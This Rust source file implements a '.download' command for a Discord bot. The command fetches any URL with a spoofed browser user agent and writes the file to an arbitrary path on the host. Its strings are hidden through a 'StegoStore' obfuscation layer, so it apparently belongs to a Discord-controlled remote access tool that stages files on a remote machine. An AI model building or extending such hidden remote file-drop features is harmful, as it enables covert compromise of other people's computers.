use serde_json;
use crate::commands::*;
use crate::core::stego_store::{StegoStore, StringCategory};
use std::boxed::Box;
use anyhow::Result;
use async_trait::async_trait;
use reqwest;
use std::fs;
use crate::core::http_client::HttpClient;
use twilight_model::channel::message::Message;

pub struct DownloadCommand;

#[async_trait]
impl BotCommand for DownloadCommand {
    fn name(&self) -> &str { "download" }
    fn description(&self) -> &str { 
        Box::leak(StegoStore::get(StringCategory::Desc, "DOWNLOAD").into_boxed_str())
    }
    fn category(&self) -> &str { "filesystem" }
    fn usage(&self) -> &str { ".download <url> [save_path]" }
    fn examples(&self) -> &'static [&'static str] { &[".download https://example.com/file.txt"] }
    fn aliases(&self) -> &'static [&'static str] { &["dl"] }

    async fn execute(
        &self,
        http: &Arc<HttpClient>,
        msg: &Message,
        mut args: Arguments,
    ) -> Result<()> {
        let url = args.next().unwrap_or("").to_string();
        let save_path_owned = args.rest();
        let save_path = save_path_owned.trim();

        if url.is_empty() {
            http.create_message(msg.channel_id.get(), "ERROR: Please provide a URL. Usage: `.download <url> [save_path]`").await?;
            return Ok(());
        }

        // Validate URL
        if !url.starts_with("http://") && !url.starts_with("https://") {
            http.create_message(msg.channel_id.get(), &format!(
                    "ERROR: Invalid URL format: `{}`. URL must start with http:// or https://",
                    url
                )).await?;
            return Ok(());
        }

        let filename = if save_path.is_empty() {
            url.split('/')
                .last()
                .unwrap_or("downloaded_file")
                .to_string()
        } else {
            save_path.to_string()
        };

        // Send starting message
        let response_msg = http
            .create_message(msg.channel_id.into(), &format!("Downloading file from `{}`...", url)).await?;
        let response_message: Message = serde_json::from_str(&response_msg)?;

        // Download the file
        let client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .timeout(std::time::Duration::from_secs(30))
            .build()?;

        match client.get(url).send().await {
            Ok(resp) => {
                if !resp.status().is_success() {
                    http.update_message(msg.channel_id, response_message.id, Some(format!(
                        "ERROR: Failed to download file. Server returned status: {}",
                        resp.status()
                    ))).await?;
                    return Ok(());
                }

                let bytes = resp.bytes().await?;
                let file_size = bytes.len();

                // Save the file
                match fs::write(&filename, &bytes) {
                    Ok(_) => {
                        let file_size_mb = file_size as f64 / 1024.0 / 1024.0;

                        http.update_message(msg.channel_id, response_message.id, Some(format!("SUCCESS: **File downloaded successfully!**\n**Filename:** `{}`\n**Size:** {:.2} MB", filename, file_size_mb))).await?;
                    }
                    Err(e) => {
                        http.update_message(msg.channel_id, response_message.id, Some(format!(
                            "ERROR: Failed to save file `{}`: {}",
                            filename, e
                        ))).await?;
                    }
                }
            }
            Err(e) => {
                http.update_message(msg.channel_id, response_message.id, Some(format!("ERROR: Failed to download file: {}", e))).await?;
            }
        }

        Ok(())
    }
}



